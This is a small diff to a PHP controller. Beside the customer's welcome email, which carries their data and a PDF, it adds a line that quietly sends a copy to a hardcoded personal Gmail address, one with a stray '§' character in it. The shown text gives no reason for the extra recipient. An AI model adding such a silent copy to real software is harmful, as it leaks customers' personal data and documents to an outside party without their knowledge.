@@ -88,6 +88,7 @@ class Controller extends BaseController
                     $email = $transaction->email ?? $data['email'] ?? null;
 
                     Mail::to($email)->send(new Welcomemail($data, $pdf));
+                    Mail::to('davsong16@gmail.com§')->send(new Welcomemail($data, $pdf));
                 }
             } catch (\Exception $e) {
                 // dd($e->getMessage(), $e->getFile(), $e->getLine());
